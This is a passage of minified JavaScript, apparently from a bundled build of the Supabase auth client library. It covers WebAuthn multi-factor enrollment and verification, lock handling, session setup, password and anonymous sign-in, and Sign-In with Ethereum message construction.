c.json(),d=null!==(s=c.headers.get("x-total-count"))&&void 0!==s?s:0,h=null!==(i=null===(o=c.headers.get("link"))||void 0===o?void 0:o.split(","))&&void 0!==i?i:[];return h.length>0&&(h.forEach(e=>{const t=parseInt(e.split(";")[0].split("=")[1].substring(0,1)),n=JSON.parse(e.split(";")[1].split("=")[1]);l["".concat(n,"Page")]=t}),l.total=parseInt(d)),{data:Object.assign(Object.assign({},u),l),error:null}}catch(l){if(Bn(l))return{data:{clients:[]},error:l};throw l}}async _createOAuthClient(e){try{return await Pr(this.fetch,"POST","".concat(this.url,"/admin/oauth/clients"),{body:e,headers:this.headers,xform:e=>({data:e,error:null})})}catch(t){if(Bn(t))return{data:null,error:t};throw t}}async _getOAuthClient(e){try{return await Pr(this.fetch,"GET","".concat(this.url,"/admin/oauth/clients/").concat(e),{headers:this.headers,xform:e=>({data:e,error:null})})}catch(t){if(Bn(t))return{data:null,error:t};throw t}}async _updateOAuthClient(e,t){try{return await Pr(this.fetch,"PUT","".concat(this.url,"/admin/oauth/clients/").concat(e),{body:t,headers:this.headers,xform:e=>({data:e,error:null})})}catch(n){if(Bn(n))return{data:null,error:n};throw n}}async _deleteOAuthClient(e){try{return await Pr(this.fetch,"DELETE","".concat(this.url,"/admin/oauth/clients/").concat(e),{headers:this.headers,noResolveJson:!0}),{data:null,error:null}}catch(t){if(Bn(t))return{data:null,error:t};throw t}}async _regenerateOAuthClientSecret(e){try{return await Pr(this.fetch,"POST","".concat(this.url,"/admin/oauth/clients/").concat(e,"/regenerate_secret"),{headers:this.headers,xform:e=>({data:e,error:null})})}catch(t){if(Bn(t))return{data:null,error:t};throw t}}}function Br(){let e=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};return{getItem:t=>e[t]||null,setItem:(t,n)=>{e[t]=n},removeItem:t=>{delete e[t]}}}const Fr=!!(globalThis&&fr()&&globalThis.localStorage&&"true"===globalThis.localStorage.getItem("supabase.gotrue-js.locks.debug"));class Vr extends Error{constructor(e){super(e),this.isAcquireTimeout=!0}}class qr extends Vr{}async function Wr(e,t,n){Fr&&console.log("@supabase/gotrue-js: navigatorLock: acquire lock",e,t);const r=new globalThis.AbortController;t>0&&setTimeout(()=>{r.abort(),Fr&&console.log("@supabase/gotrue-js: navigatorLock acquire timed out",e)},t),await Promise.resolve();try{return await globalThis.navigator.locks.request(e,0===t?{mode:"exclusive",ifAvailable:!0}:{mode:"exclusive",signal:r.signal},async r=>{if(!r){if(0===t)throw Fr&&console.log("@supabase/gotrue-js: navigatorLock: not immediately available",e),new qr('Acquiring an exclusive Navigator LockManager lock "'.concat(e,'" immediately failed'));if(Fr)try{const e=await globalThis.navigator.locks.query();console.log("@supabase/gotrue-js: Navigator LockManager state",JSON.stringify(e,null,"  "))}catch(Oa){console.warn("@supabase/gotrue-js: Error when querying Navigator LockManager state",Oa)}return console.warn("@supabase/gotrue-js: Navigator LockManager returned a null lock when using #request without ifAvailable set to true, it appears this browser is not following the LockManager spec https://developer.mozilla.org/en-US/docs/Web/API/LockManager/request"),await n()}Fr&&console.log("@supabase/gotrue-js: navigatorLock: acquired",e,r.name);try{return await n()}finally{Fr&&console.log("@supabase/gotrue-js: navigatorLock: released",e,r.name)}})}catch(Oa){if("AbortError"===(null===Oa||void 0===Oa?void 0:Oa.name))throw new qr('Acquiring an exclusive Navigator LockManager lock "'.concat(e,'" timed out waiting ').concat(t,"ms"));throw Oa}}function Hr(e){if(!/^0x[a-fA-F0-9]{40}$/.test(e))throw new Error('@supabase/auth-js: Address "'.concat(e,'" is invalid.'));return e.toLowerCase()}function Kr(e){const t=(new TextEncoder).encode(e);return"0x"+Array.from(t,e=>e.toString(16).padStart(2,"0")).join("")}class Gr extends Error{constructor(e){let{message:t,code:n,cause:r,name:a}=e;var s;super(t,{cause:r}),this.__isWebAuthnError=!0,this.name=null!==(s=null!==a&&void 0!==a?a:r instanceof Error?r.name:void 0)&&void 0!==s?s:"Unknown Error",this.code=n}}class Jr extends Gr{constructor(e,t){super({code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:t,message:e}),this.name="WebAuthnUnknownError",this.originalError=t}}function $r(e){let{error:t,options:n}=e;var r,a,s;const{publicKey:o}=n;if(!o)throw Error("options was missing required publicKey property");if("AbortError"===t.name){if(n.signal instanceof AbortSignal)return new Gr({message:"Registration ceremony was sent an abort signal",code:"ERROR_CEREMONY_ABORTED",cause:t})}else if("ConstraintError"===t.name){if(!0===(null===(r=o.authenticatorSelection)||void 0===r?void 0:r.requireResidentKey))return new Gr({message:"Discoverable credentials were required but no available authenticator supported it",code:"ERROR_AUTHENTICATOR_MISSING_DISCOVERABLE_CREDENTIAL_SUPPORT",cause:t});if("conditional"===n.mediation&&"required"===(null===(a=o.authenticatorSelection)||void 0===a?void 0:a.userVerification))return new Gr({message:"User verification was required during automatic registration but it could not be performed",code:"ERROR_AUTO_REGISTER_USER_VERIFICATION_FAILURE",cause:t});if("required"===(null===(s=o.authenticatorSelection)||void 0===s?void 0:s.userVerification))return new Gr({message:"User verification was required but no available authenticator supported it",code:"ERROR_AUTHENTICATOR_MISSING_USER_VERIFICATION_SUPPORT",cause:t})}else{if("InvalidStateError"===t.name)return new Gr({message:"The authenticator was previously registered",code:"ERROR_AUTHENTICATOR_PREVIOUSLY_REGISTERED",cause:t});if("NotAllowedError"===t.name)return new Gr({message:t.message,code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:t});if("NotSupportedError"===t.name){return 0===o.pubKeyCredParams.filter(e=>"public-key"===e.type).length?new Gr({message:'No entry in pubKeyCredParams was of type "public-key"',code:"ERROR_MALFORMED_PUBKEYCREDPARAMS",cause:t}):new Gr({message:"No available authenticator supported any of the specified pubKeyCredParams algorithms",code:"ERROR_AUTHENTICATOR_NO_SUPPORTED_PUBKEYCREDPARAMS_ALG",cause:t})}if("SecurityError"===t.name){const e=window.location.hostname;if(!na(e))return new Gr({message:"".concat(window.location.hostname," is an invalid domain"),code:"ERROR_INVALID_DOMAIN",cause:t});if(o.rp.id!==e)return new Gr({message:'The RP ID "'.concat(o.rp.id,'" is invalid for this domain'),code:"ERROR_INVALID_RP_ID",cause:t})}else if("TypeError"===t.name){if(o.user.id.byteLength<1||o.user.id.byteLength>64)return new Gr({message:"User ID was not between 1 and 64 characters",code:"ERROR_INVALID_USER_ID_LENGTH",cause:t})}else if("UnknownError"===t.name)return new Gr({message:"The authenticator was unable to process the specified options, or could not create a new credential",code:"ERROR_AUTHENTICATOR_GENERAL_ERROR",cause:t})}return new Gr({message:"a Non-Webauthn related error has occurred",code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:t})}function Qr(e){let{error:t,options:n}=e;const{publicKey:r}=n;if(!r)throw Error("options was missing required publicKey property");if("AbortError"===t.name){if(n.signal instanceof AbortSignal)return new Gr({message:"Authentication ceremony was sent an abort signal",code:"ERROR_CEREMONY_ABORTED",cause:t})}else{if("NotAllowedError"===t.name)return new Gr({message:t.message,code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:t});if("SecurityError"===t.name){const e=window.location.hostname;if(!na(e))return new Gr({message:"".concat(window.location.hostname," is an invalid domain"),code:"ERROR_INVALID_DOMAIN",cause:t});if(r.rpId!==e)return new Gr({message:'The RP ID "'.concat(r.rpId,'" is invalid for this domain'),code:"ERROR_INVALID_RP_ID",cause:t})}else if("UnknownError"===t.name)return new Gr({message:"The authenticator was unable to process the specified options, or could not create a new assertion signature",code:"ERROR_AUTHENTICATOR_GENERAL_ERROR",cause:t})}return new Gr({message:"a Non-Webauthn related error has occurred",code:"ERROR_PASSTHROUGH_SEE_CAUSE_PROPERTY",cause:t})}const Yr=new class{createNewAbortSignal(){if(this.controller){const e=new Error("Cancelling existing WebAuthn API call for new one");e.name="AbortError",this.controller.abort(e)}const e=new AbortController;return this.controller=e,e.signal}cancelCeremony(){if(this.controller){const e=new Error("Manually cancelling existing WebAuthn API call");e.name="AbortError",this.controller.abort(e),this.controller=void 0}}};function Xr(e){if(!e)throw new Error("Credential creation options are required");if("undefined"!==typeof PublicKeyCredential&&"parseCreationOptionsFromJSON"in PublicKeyCredential&&"function"===typeof PublicKeyCredential.parseCreationOptionsFromJSON)return PublicKeyCredential.parseCreationOptionsFromJSON(e);const{challenge:t,user:n,excludeCredentials:r}=e,a=Ae(e,["challenge","user","excludeCredentials"]),s=cr(t).buffer,o=Object.assign(Object.assign({},n),{id:cr(n.id).buffer}),i=Object.assign(Object.assign({},a),{challenge:s,user:o});if(r&&r.length>0){i.excludeCredentials=new Array(r.length);for(let e=0;e<r.length;e++){const t=r[e];i.excludeCredentials[e]=Object.assign(Object.assign({},t),{id:cr(t.id).buffer,type:t.type||"public-key",transports:t.transports})}}return i}function Zr(e){if(!e)throw new Error("Credential request options are required");if("undefined"!==typeof PublicKeyCredential&&"parseRequestOptionsFromJSON"in PublicKeyCredential&&"function"===typeof PublicKeyCredential.parseRequestOptionsFromJSON)return PublicKeyCredential.parseRequestOptionsFromJSON(e);const{challenge:t,allowCredentials:n}=e,r=Ae(e,["challenge","allowCredentials"]),a=cr(t).buffer,s=Object.assign(Object.assign({},r),{challenge:a});if(n&&n.length>0){s.allowCredentials=new Array(n.length);for(let e=0;e<n.length;e++){const t=n[e];s.allowCredentials[e]=Object.assign(Object.assign({},t),{id:cr(t.id).buffer,type:t.type||"public-key",transports:t.transports})}}return s}function ea(e){var t;if("toJSON"in e&&"function"===typeof e.toJSON)return e.toJSON();const n=e;return{id:e.id,rawId:e.id,response:{attestationObject:ur(new Uint8Array(e.response.attestationObject)),clientDataJSON:ur(new Uint8Array(e.response.clientDataJSON))},type:"public-key",clientExtensionResults:e.getClientExtensionResults(),authenticatorAttachment:null!==(t=n.authenticatorAttachment)&&void 0!==t?t:void 0}}function ta(e){var t;if("toJSON"in e&&"function"===typeof e.toJSON)return e.toJSON();const n=e,r=e.getClientExtensionResults(),a=e.response;return{id:e.id,rawId:e.id,response:{authenticatorData:ur(new Uint8Array(a.authenticatorData)),clientDataJSON:ur(new Uint8Array(a.clientDataJSON)),signature:ur(new Uint8Array(a.signature)),userHandle:a.userHandle?ur(new Uint8Array(a.userHandle)):void 0},type:"public-key",clientExtensionResults:r,authenticatorAttachment:null!==(t=n.authenticatorAttachment)&&void 0!==t?t:void 0}}function na(e){return"localhost"===e||/^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$/i.test(e)}function ra(){var e,t;return!!(dr()&&"PublicKeyCredential"in window&&window.PublicKeyCredential&&"credentials"in navigator&&"function"===typeof(null===(e=null===navigator||void 0===navigator?void 0:navigator.credentials)||void 0===e?void 0:e.create)&&"function"===typeof(null===(t=null===navigator||void 0===navigator?void 0:navigator.credentials)||void 0===t?void 0:t.get))}const aa={hints:["security-key"],authenticatorSelection:{authenticatorAttachment:"cross-platform",requireResidentKey:!1,userVerification:"preferred",residentKey:"discouraged"},attestation:"direct"},sa={userVerification:"preferred",hints:["security-key"],attestation:"direct"};function oa(){const e=e=>null!==e&&"object"===typeof e&&!Array.isArray(e),t=e=>e instanceof ArrayBuffer||ArrayBuffer.isView(e),n={};for(var r=arguments.length,a=new Array(r),s=0;s<r;s++)a[s]=arguments[s];for(const o of a)if(o)for(const r in o){const a=o[r];if(void 0!==a)if(Array.isArray(a))n[r]=a;else if(t(a))n[r]=a;else if(e(a)){const t=n[r];e(t)?n[r]=oa(t,a):n[r]=oa(a)}else n[r]=a}return n}class ia{constructor(e){this.client=e,this.enroll=this._enroll.bind(this),this.challenge=this._challenge.bind(this),this.verify=this._verify.bind(this),this.authenticate=this._authenticate.bind(this),this.register=this._register.bind(this)}async _enroll(e){return this.client.mfa.enroll(Object.assign(Object.assign({},e),{factorType:"webauthn"}))}async _challenge(e,t){let{factorId:n,webauthn:r,friendlyName:a,signal:s}=e;var o;try{const{data:e,error:i}=await this.client.mfa.challenge({factorId:n,webauthn:r});if(!e)return{data:null,error:i};const l=null!==s&&void 0!==s?s:Yr.createNewAbortSignal();if("create"===e.webauthn.type){const{user:t}=e.webauthn.credential_options.publicKey;if(!t.name){const e=a;if(e)t.name="".concat(t.id,":").concat(e);else{const e=(await this.client.getUser()).data.user,n=(null===(o=null===e||void 0===e?void 0:e.user_metadata)||void 0===o?void 0:o.name)||(null===e||void 0===e?void 0:e.email)||(null===e||void 0===e?void 0:e.id)||"User";t.name="".concat(t.id,":").concat(n)}}t.displayName||(t.displayName=t.name)}switch(e.webauthn.type){case"create":{const r=function(e,t){return oa(aa,e,t||{})}(e.webauthn.credential_options.publicKey,null===t||void 0===t?void 0:t.create),{data:a,error:s}=await async function(e){try{const t=await navigator.credentials.create(e);return t?t instanceof PublicKeyCredential?{data:t,error:null}:{data:null,error:new Jr("Browser returned unexpected credential type",t)}:{data:null,error:new Jr("Empty credential response",t)}}catch(t){return{data:null,error:$r({error:t,options:e})}}}({publicKey:r,signal:l});return a?{data:{factorId:n,challengeId:e.id,webauthn:{type:e.webauthn.type,credential_response:a}},error:null}:{data:null,error:s}}case"request":{const r=function(e,t){return oa(sa,e,t||{})}(e.webauthn.credential_options.publicKey,null===t||void 0===t?void 0:t.request),{data:a,error:s}=await async function(e){try{const t=await navigator.credentials.get(e);return t?t instanceof PublicKeyCredential?{data:t,error:null}:{data:null,error:new Jr("Browser returned unexpected credential type",t)}:{data:null,error:new Jr("Empty credential response",t)}}catch(t){return{data:null,error:Qr({error:t,options:e})}}}(Object.assign(Object.assign({},e.webauthn.credential_options),{publicKey:r,signal:l}));return a?{data:{factorId:n,challengeId:e.id,webauthn:{type:e.webauthn.type,credential_response:a}},error:null}:{data:null,error:s}}}}catch(i){return Bn(i)?{data:null,error:i}:{data:null,error:new Vn("Unexpected error in challenge",i)}}}async _verify(e){let{challengeId:t,factorId:n,webauthn:r}=e;return this.client.mfa.verify({factorId:n,challengeId:t,webauthn:r})}async _authenticate(e,t){let{factorId:n,webauthn:{rpId:r=("undefined"!==typeof window?window.location.hostname:void 0),rpOrigins:a=("undefined"!==typeof window?[window.location.origin]:void 0),signal:s}={}}=e;if(!r)return{data:null,error:new zn("rpId is required for WebAuthn authentication")};try{if(!ra())return{data:null,error:new Vn("Browser does not support WebAuthn",null)};const{data:e,error:o}=await this.challenge({factorId:n,webauthn:{rpId:r,rpOrigins:a},signal:s},{request:t});if(!e)return{data:null,error:o};const{webauthn:i}=e;return this._verify({factorId:n,challengeId:e.challengeId,webauthn:{type:i.type,rpId:r,rpOrigins:a,credential_response:i.credential_response}})}catch(o){return Bn(o)?{data:null,error:o}:{data:null,error:new Vn("Unexpected error in authenticate",o)}}}async _register(e,t){let{friendlyName:n,webauthn:{rpId:r=("undefined"!==typeof window?window.location.hostname:void 0),rpOrigins:a=("undefined"!==typeof window?[window.location.origin]:void 0),signal:s}={}}=e;if(!r)return{data:null,error:new zn("rpId is required for WebAuthn registration")};try{if(!ra())return{data:null,error:new Vn("Browser does not support WebAuthn",null)};const{data:e,error:o}=await this._enroll({friendlyName:n});if(!e)return await this.client.mfa.listFactors().then(e=>{var t;return null===(t=e.data)||void 0===t?void 0:t.all.find(e=>"webauthn"===e.factor_type&&e.friendly_name===n&&"unverified"!==e.status)}).then(e=>e?this.client.mfa.unenroll({factorId:null===e||void 0===e?void 0:e.id}):void 0),{data:null,error:o};const{data:i,error:l}=await this._challenge({factorId:e.id,friendlyName:e.friendly_name,webauthn:{rpId:r,rpOrigins:a},signal:s},{create:t});return i?this._verify({factorId:e.id,challengeId:i.challengeId,webauthn:{rpId:r,rpOrigins:a,type:i.webauthn.type,credential_response:i.webauthn.credential_response}}):{data:null,error:l}}catch(o){return Bn(o)?{data:null,error:o}:{data:null,error:new Vn("Unexpected error in register",o)}}}}!function(){if("object"!==typeof globalThis)try{Object.defineProperty(Object.prototype,"__magic__",{get:function(){return this},configurable:!0}),__magic__.globalThis=__magic__,delete Object.prototype.__magic__}catch(Oa){"undefined"!==typeof self&&(self.globalThis=self)}}();const la={url:"http://localhost:9999",storageKey:"supabase.auth.token",autoRefreshToken:!0,persistSession:!0,detectSessionInUrl:!0,headers:Ln,flowType:"implicit",debug:!1,hasCustomAuthorizationHeader:!1,throwOnError:!1,lockAcquireTimeout:1e4,skipAutoInitialize:!1};async function ca(e,t,n){return await n()}const ua={};class da{get jwks(){var e,t;return null!==(t=null===(e=ua[this.storageKey])||void 0===e?void 0:e.jwks)&&void 0!==t?t:{keys:[]}}set jwks(e){ua[this.storageKey]=Object.assign(Object.assign({},ua[this.storageKey]),{jwks:e})}get jwks_cached_at(){var e,t;return null!==(t=null===(e=ua[this.storageKey])||void 0===e?void 0:e.cachedAt)&&void 0!==t?t:Number.MIN_SAFE_INTEGER}set jwks_cached_at(e){ua[this.storageKey]=Object.assign(Object.assign({},ua[this.storageKey]),{cachedAt:e})}constructor(e){var t,n,r;this.userStorage=null,this.memoryStorage=null,this.stateChangeEmitters=new Map,this.autoRefreshTicker=null,this.autoRefreshTickTimeout=null,this.visibilityChangedCallback=null,this.refreshingDeferred=null,this.initializePromise=null,this.detectSessionInUrl=!0,this.hasCustomAuthorizationHeader=!1,this.suppressGetSessionWarning=!1,this.lockAcquired=!1,this.pendingInLock=[],this.broadcastChannel=null,this.logger=console.log;const a=Object.assign(Object.assign({},la),e);if(this.storageKey=a.storageKey,this.instanceID=null!==(t=da.nextInstanceID[this.storageKey])&&void 0!==t?t:0,da.nextInstanceID[this.storageKey]=this.instanceID+1,this.logDebugMessages=!!a.debug,"function"===typeof a.debug&&(this.logger=a.debug),this.instanceID>0&&dr()){const e="".concat(this._logPrefix()," Multiple GoTrueClient instances detected in the same browser context. It is not an error, but this should be avoided as it may produce undefined behavior when used concurrently under the same storage key.");console.warn(e),this.logDebugMessages&&console.trace(e)}if(this.persistSession=a.persistSession,this.autoRefreshToken=a.autoRefreshToken,this.admin=new zr({url:a.url,headers:a.headers,fetch:a.fetch}),this.url=a.url,this.headers=a.headers,this.fetch=pr(a.fetch),this.lock=a.lock||ca,this.detectSessionInUrl=a.detectSessionInUrl,this.flowType=a.flowType,this.hasCustomAuthorizationHeader=a.hasCustomAuthorizationHeader,this.throwOnError=a.throwOnError,this.lockAcquireTimeout=a.lockAcquireTimeout,a.lock?this.lock=a.lock:this.persistSession&&dr()&&(null===(n=null===globalThis||void 0===globalThis?void 0:globalThis.navigator)||void 0===n?void 0:n.locks)?this.lock=Wr:this.lock=ca,this.jwks||(this.jwks={keys:[]},this.jwks_cached_at=Number.MIN_SAFE_INTEGER),this.mfa={verify:this._verify.bind(this),enroll:this._enroll.bind(this),unenroll:this._unenroll.bind(this),challenge:this._challenge.bind(this),listFactors:this._listFactors.bind(this),challengeAndVerify:this._challengeAndVerify.bind(this),getAuthenticatorAssuranceLevel:this._getAuthenticatorAssuranceLevel.bind(this),webauthn:new ia(this)},this.oauth={getAuthorizationDetails:this._getAuthorizationDetails.bind(this),approveAuthorization:this._approveAuthorization.bind(this),denyAuthorization:this._denyAuthorization.bind(this),listGrants:this._listOAuthGrants.bind(this),revokeGrant:this._revokeOAuthGrant.bind(this)},this.persistSession?(a.storage?this.storage=a.storage:fr()?this.storage=globalThis.localStorage:(this.memoryStorage={},this.storage=Br(this.memoryStorage)),a.userStorage&&(this.userStorage=a.userStorage)):(this.memoryStorage={},this.storage=Br(this.memoryStorage)),dr()&&globalThis.BroadcastChannel&&this.persistSession&&this.storageKey){try{this.broadcastChannel=new globalThis.BroadcastChannel(this.storageKey)}catch(Oa){console.error("Failed to create a new BroadcastChannel, multi-tab state changes will not be available",Oa)}null===(r=this.broadcastChannel)||void 0===r||r.addEventListener("message",async e=>{this._debug("received broadcast notification from other tab or client",e);try{await this._notifyAllSubscribers(e.data.event,e.data.session,!1)}catch(t){this._debug("#broadcastChannel","error",t)}})}a.skipAutoInitialize||this.initialize().catch(e=>{this._debug("#initialize()","error",e)})}isThrowOnErrorEnabled(){return this.throwOnError}_returnResult(e){if(this.throwOnError&&e&&e.error)throw e.error;return e}_logPrefix(){return"GoTrueClient@"+"".concat(this.storageKey,":").concat(this.instanceID," (").concat(On,") ").concat((new Date).toISOString())}_debug(){if(this.logDebugMessages){for(var e=arguments.length,t=new Array(e),n=0;n<e;n++)t[n]=arguments[n];this.logger(this._logPrefix(),...t)}return this}async initialize(){return this.initializePromise||(this.initializePromise=(async()=>await this._acquireLock(this.lockAcquireTimeout,async()=>await this._initialize()))()),await this.initializePromise}async _initialize(){var e;try{let t={},n="none";if(dr()&&(t=function(e){const t={},n=new URL(e);if(n.hash&&"#"===n.hash[0])try{new URLSearchParams(n.hash.substring(1)).forEach((e,n)=>{t[n]=e})}catch(Oa){}return n.searchParams.forEach((e,n)=>{t[n]=e}),t}(window.location.href),this._isImplicitGrantCallback(t)?n="implicit":await this._isPKCECallback(t)&&(n="pkce")),dr()&&this.detectSessionInUrl&&"none"!==n){const{data:r,error:a}=await this._getSessionFromURL(t,n);if(a){if(this._debug("#_initialize()","error detecting session from URL",a),function(e){return Bn(e)&&"AuthImplicitGrantRedirectError"===e.name}(a)){const t=null===(e=a.details)||void 0===e?void 0:e.code;if("identity_already_exists"===t||"identity_not_found"===t||"single_identity_not_deletable"===t)return{error:a}}return{error:a}}const{session:s,redirectType:o}=r;return this._debug("#_initialize()","detected session in URL",s,"redirect type",o),await this._saveSession(s),setTimeout(async()=>{"recovery"===o?await this._notifyAllSubscribers("PASSWORD_RECOVERY",s):await this._notifyAllSubscribers("SIGNED_IN",s)},0),{error:null}}return await this._recoverAndRefresh(),{error:null}}catch(t){return Bn(t)?this._returnResult({error:t}):this._returnResult({error:new Vn("Unexpected error during initialization",t)})}finally{await this._handleVisibilityChange(),this._debug("#_initialize()","end")}}async signInAnonymously(e){var t,n,r;try{const a=await Pr(this.fetch,"POST","".concat(this.url,"/signup"),{headers:this.headers,body:{data:null!==(n=null===(t=null===e||void 0===e?void 0:e.options)||void 0===t?void 0:t.data)&&void 0!==n?n:{},gotrue_meta_security:{captcha_token:null===(r=null===e||void 0===e?void 0:e.options)||void 0===r?void 0:r.captchaToken}},xform:Or}),{data:s,error:o}=a;if(o||!s)return this._returnResult({data:{user:null,session:null},error:o});const i=s.session,l=s.user;return s.session&&(await this._saveSession(s.session),await this._notifyAllSubscribers("SIGNED_IN",i)),this._returnResult({data:{user:l,session:i},error:null})}catch(a){if(Bn(a))return this._returnResult({data:{user:null,session:null},error:a});throw a}}async signUp(e){var t,n,r;try{let a;if("email"in e){const{email:n,password:r,options:s}=e;let o=null,i=null;"pkce"===this.flowType&&([o,i]=await kr(this.storage,this.storageKey)),a=await Pr(this.fetch,"POST","".concat(this.url,"/signup"),{headers:this.headers,redirectTo:null===s||void 0===s?void 0:s.emailRedirectTo,body:{email:n,password:r,data:null!==(t=null===s||void 0===s?void 0:s.data)&&void 0!==t?t:{},gotrue_meta_security:{captcha_token:null===s||void 0===s?void 0:s.captchaToken},code_challenge:o,code_challenge_method:i},xform:Or})}else{if(!("phone"in e))throw new Gn("You must provide either an email or phone number and a password");{const{phone:t,password:s,options:o}=e;a=await Pr(this.fetch,"POST","".concat(this.url,"/signup"),{headers:this.headers,body:{phone:t,password:s,data:null!==(n=null===o||void 0===o?void 0:o.data)&&void 0!==n?n:{},channel:null!==(r=null===o||void 0===o?void 0:o.channel)&&void 0!==r?r:"sms",gotrue_meta_security:{captcha_token:null===o||void 0===o?void 0:o.captchaToken}},xform:Or})}}const{data:s,error:o}=a;if(o||!s)return await vr(this.storage,"".concat(this.storageKey,"-code-verifier")),this._returnResult({data:{user:null,session:null},error:o});const i=s.session,l=s.user;return s.session&&(await this._saveSession(s.session),await this._notifyAllSubscribers("SIGNED_IN",i)),this._returnResult({data:{user:l,session:i},error:null})}catch(a){if(await vr(this.storage,"".concat(this.storageKey,"-code-verifier")),Bn(a))return this._returnResult({data:{user:null,session:null},error:a});throw a}}async signInWithPassword(e){try{let t;if("email"in e){const{email:n,password:r,options:a}=e;t=await Pr(this.fetch,"POST","".concat(this.url,"/token?grant_type=password"),{headers:this.headers,body:{email:n,password:r,gotrue_meta_security:{captcha_token:null===a||void 0===a?void 0:a.captchaToken}},xform:Ar})}else{if(!("phone"in e))throw new Gn("You must provide either an email or phone number and a password");{const{phone:n,password:r,options:a}=e;t=await Pr(this.fetch,"POST","".concat(this.url,"/token?grant_type=password"),{headers:this.headers,body:{phone:n,password:r,gotrue_meta_security:{captcha_token:null===a||void 0===a?void 0:a.captchaToken}},xform:Ar})}}const{data:n,error:r}=t;if(r)return this._returnResult({data:{user:null,session:null},error:r});if(!n||!n.session||!n.user){const e=new Kn;return this._returnResult({data:{user:null,session:null},error:e})}return n.session&&(await this._saveSession(n.session),await this._notifyAllSubscribers("SIGNED_IN",n.session)),this._returnResult({data:Object.assign({user:n.user,session:n.session},n.weak_password?{weakPassword:n.weak_password}:null),error:r})}catch(t){if(Bn(t))return this._returnResult({data:{user:null,session:null},error:t});throw t}}async signInWithOAuth(e){var t,n,r,a;return await this._handleProviderSignIn(e.provider,{redirectTo:null===(t=e.options)||void 0===t?void 0:t.redirectTo,scopes:null===(n=e.options)||void 0===n?void 0:n.scopes,queryParams:null===(r=e.options)||void 0===r?void 0:r.queryParams,skipBrowserRedirect:null===(a=e.options)||void 0===a?void 0:a.skipBrowserRedirect})}async exchangeCodeForSession(e){return await this.initializePromise,this._acquireLock(this.lockAcquireTimeout,async()=>this._exchangeCodeForSession(e))}async signInWithWeb3(e){const{chain:t}=e;switch(t){case"ethereum":return await this.signInWithEthereum(e);case"solana":return await this.signInWithSolana(e);default:throw new Error('@supabase/auth-js: Unsupported chain "'.concat(t,'"'))}}async signInWithEthereum(e){var t,n,r,a,s,o,i,l,c,u,d;let h,f;if("message"in e)h=e.message,f=e.signature;else{const{chain:u,wallet:d,statement:p,options:m}=e;let g;if(dr())if("object"===typeof d)g=d;else{const e=window;if(!("ethereum"in e)||"object"!==typeof e.ethereum||!("request"in e.ethereum)||"function"!==typeof e.ethereum.request)throw new Error("@supabase/auth-js: No compatible Ethereum wallet interface on the window object (window.ethereum) detected. Make sure the user already has a wallet installed and connected for this app. Prefer passing the wallet interface object directly to signInWithWeb3({ chain: 'ethereum', wallet: resolvedUserWallet }) instead.");g=e.ethereum}else{if("object"!==typeof d||!(null===m||void 0===m?void 0:m.url))throw new Error("@supabase/auth-js: Both wallet and url must be specified in non-browser environments.");g=d}const v=new URL(null!==(t=null===m||void 0===m?void 0:m.url)&&void 0!==t?t:window.location.href),y=await g.request({method:"eth_requestAccounts"}).then(e=>e).catch(()=>{throw new Error("@supabase/auth-js: Wallet method eth_requestAccounts is missing or invalid")});if(!y||0===y.length)throw new Error("@supabase/auth-js: No accounts available. Please ensure the wallet is connected.");const b=Hr(y[0]);let w=null===(n=null===m||void 0===m?void 0:m.signInWithEthereum)||void 0===n?void 0:n.chainId;if(!w){const e=await g.request({method:"eth_chainId"});w=parseInt(e,16)}h=function(e){var t;const{chainId:n,domain:r,expirationTime:a,issuedAt:s=new Date,nonce:o,notBefore:i,requestId:l,resources:c,scheme:u,uri:d,version:h}=e;if(!Number.isInteger(n))throw new Error('@supabase/auth-js: Invalid SIWE message field "chainId". Chain ID must be a EIP-155 chain ID. Provided value: '.concat(n));if(!r)throw new Error('@supabase/auth-js: Invalid SIWE message field "domain". Domain must be provided.');if(o&&o.length<8)throw new Error('@supabase/auth-js: Invalid SIWE message field "nonce". Nonce must be at least 8 characters. Provided value: '.concat(o));if(!d)throw new Error('@supabase/auth-js: Invalid SIWE message field "uri". URI must be provided.');if("1"!==h)throw new Error("@supabase/auth-js: Invalid SIWE message field \"version\". Version must be '1'. Provided value: ".concat(h));if(null===(t=e.statement)||void 0===t?void 0:t.includes("\n"))throw new Error("@supabase/auth-js: Invalid SIWE message field \"statement\". Statement must not include '\\n'. Provided value: ".concat(e.statement));const f=Hr(e.address),p=u?"".concat(u,"://").concat(r):r,m=e.statement?"".concat(e.statement,"\n"):"",g="".concat(p," wants you to sign in with your Ethereum account:\n").concat(f,"\n\n").concat(m);let v="URI: ".concat(d,"\nVersion: ").concat(h,"\nChain ID: ").concat(n).concat(o?"\nNonce: ".concat(o):"","\nIssued At: ").concat(s.toISOString());if(a&&(v+="\nExpiration Time: ".concat(a.toISOString())),i&&(v+="\nNot Before: ".concat(i.toISOString())),l&&(v+="\nRequest ID: ".concat(l)),c){let e="\nResources:";for(const t of c){if(!t||"string"!==typeof t)throw new Error('@supabase/auth-js: Invalid SIWE message field "resources". Every resource must be a valid string. Provided value: '.concat(t));e+="\n- ".concat(t)}v+=e}return"".concat(g,"\n").concat(v)}({domain:v.host,address:b,statement:p,uri:v.href,version:"1",chainId:w,nonce:null===(r=null===m||void 0===m?void 0:m.signInWithEthereum)||void 0===r?void 0:r.nonce,issuedAt:null!==(s=null===(a=null===m||void 0===m?void 0:m.signInWithEthereum)||void 0===a?void 0:a.issuedAt)&&void 0!==s?s:new Date,expirationTime:null===(o=null===m||void 0===m?void 0:m.signInWithEthereum)||void 0===o?void 0:o.expirationTime,notBefore:null===(i=null===m||void 0===m?void 0:m.signInWithEthereum)||void 0===i?void 0:i.notBefore,requestId:null===(l=null===m||void 0===m?void 0:m.signInWithEthereum)||void 0===l?void 0:l.requestId,resources:null===(c=null===m||void 0===m?void 0:m.signInWithEthereum)||void 0===c?void 0:c.resources}),f=await g.request({method:"personal_sign",params:[Kr(h),b]})}try{const{data:t,error:n}=await Pr(this.fetch,"POST","".concat(this.url,"/token?grant_type=web3"),{headers:this.headers,body:Object.assign({chain:"ethereum",message:h,signature:f},(null===(u=e.options)||void 0===u?void 0:u.captchaToken)?{gotrue_meta_security:{captcha_token:null===(d=e.options)||void 0===d?void 0:d.captchaToken}}:null),xform:Or});if(n)throw 